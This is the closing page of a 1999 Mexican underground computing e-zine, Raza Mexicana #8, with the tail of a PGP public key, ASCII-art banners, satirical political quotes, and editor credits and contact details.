 fWg7eQGMbu6iQuDLpds+baN3EtxFF6xy9pDAeHXmHw69wZMD1wnCfdO4pfDEB1IX
 Kgh9A/9h9NLl2McJktmt+l8MzD4mMFHmTH29nvUvHiw03Ledpf3Jx3DLX7sdAZny
 dLgdCvoZPbT575gpNZ3HYpLnqvTOplHqzLN4skQUTWIl2YSHqXJLYuT0CXVHHdd5
 2eSc7RzPUeFx4F9PkOi7DEtW2sFoji3dGNjcFHie0ktzOttQ6bQZWW9fU295IDx2
 YXJmQGJpZ2Zvb3QuY29tPokASwQQEQIACwUCNd3f3QQLAwIBAAoJENESGWgQQAWY
 Ef8AoNKfkQ0TUZ2i6M9M+Ao79Mst5hkcAJ9ojAytqkF9HW/87ucLwUeXbhP70LkC
 DQQ13d/fEAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlLOCDaAadWoxTpj0BV
 89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N286Z4VeSWc39uK50
 T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/RgBYK+X0iP1YTknb
 zSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2Ou1WMuF040zT9fBdX
 Q6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqVDNmWn6vQClCbAkbT
 CD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAggAu2giagpJiqf2Yjk/wb8aAd3a
 b0UV6mZ2T6pzXV7O4xwko9IWNaCYDCs5xJloH0lr8mfgTujO1EnyydKPOG3jjFFz
 4Do2vZ1VMnzLQ25tZMYHOn+8qum25onXgKbWU4wLfZWoMNy88NUI+ubjRmywLuGB
 /+jptPC6h33teJYqoqSoX7AXH/HtnO6pTjdXZQvCkNpAtddjCc/7w7ydjgoSmz9f
 wvfPs/fXBfJ0/hZFsEELZJicE5PNQ8PKdmQL56ttiuYylk4C2IHjF9g/32AMo/TH
 S2Hd+buyYjZE36MEpIXEuWf/5wxZSjl0TmRL37ffd1Uqey0WraZI3YgCpZttSokA
 RgQYEQIABgUCNd3f4AAKCRDREhloEEAFmMQgAJ0SvPcAjrZ6c1Yp08S1IrZcWudQ
 VQCg9jwTxlwRdQAWIFHqwZ3y0uB7BxA=
 =z8re
 -----END PGP PUBLIC KEY BLOCK-----
 
                                                  R4ZA m3Xi[N HkR$ TM
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ< 

  _______________________/\[  D E S P E D I D A ]\______________________


                "1 de cada 3 mexicanos cuenta con educacion"
                           - Ernesto Zedillo , Presidente de Mexico
                               V Informe de Gobierno


                     "Gobernacion me hace los mandados"
                                       - Vicente FoX - 

                                 "Igual"
                                       - Raza Mexicana =)


                         "2 de Octubre, No se Olvida"
                                       - Pueblo Mexicano


  -------------------------------------------------------------------------
  --[ WebSite Oficial :  www.raza-mexicana.org
  --[ E-Mail Oficial  :  raza-mexicana@bigfoot.com
  --[ Canal Oficial   :  Clausurado
  --[ Editor #8       :  KuKulKan
  --[ Co-Editores     :  Yo_Soy , xDAWN
  --[ El nuevo        :  Vlad
  --[ Saludos para    :  Plastik77, Pixelated, Yield20, AloneX, FZero
                         RareGaZz, Proyecto_R, Rebeli0n, Hven, DigitalRebel
  -------------------------------------------------------------------------

                  .,sSSSSSSSSs,.       .sxxs.       .sxxs.
                 l$$$$$$??$$$$$$b     l$$$$$$s.   .s$$$$$$      
                 l$$$$$$ x l$$$$$l    l$$$$$$$Ss.sS$$$$$$$       
           ษษอออ $$$$$$ ออ l$$$$$ ออ '$$$$$$'$$$$$$'l$$$$$ อออปป 
           ฐฐ xx $$$$$$ xx $$$$$$ xxx $$$$$$ s$$$$s l$$$$$ xx ฐฐ   
           ฐฐ xx $$$$$$ x $$$$$$' xxx $$$$$$  '$$'  l$$$$$ xx ฐฐ    
           ฐฐ xx $$$$$$ l$$$$$j  xxxx $$$$$$ x $$ x l$$$$$ xx ฐฐ    
           ฐฐ xx $$$$$$ x'l$$$$$$  xx $$$$$$ x '' x l$$$$$ xx ฐฐ    
           ฐฐ xx $$$$$$ xx l$$$$$$ xx $$$$$$ xxxxxx l$$$$$ xx ฐฐ    
           ศศอออ $$$$$$ ออ l$$$$$& ออ L$$$$$ ออออออ l$$$$$ อออผผ    
                 L$$$&'    l$$&''      '&$$l        l$$&' VaRf'   
                 L$$&'     $&'           &$'        $&'

                           CopyRight (c) 1998 - 1999
                   Raza Mexicana E-Zine #8, Octubre de 1999.
 
 อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 Revista electronica con temas Informaticos y de Computacion Subterranea.
 Puede ser distribuida siempre y cuando no se modifique el contenido del
 mismo. Los articulos incluidos son propiedad de sus respectivos escritores.
 อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
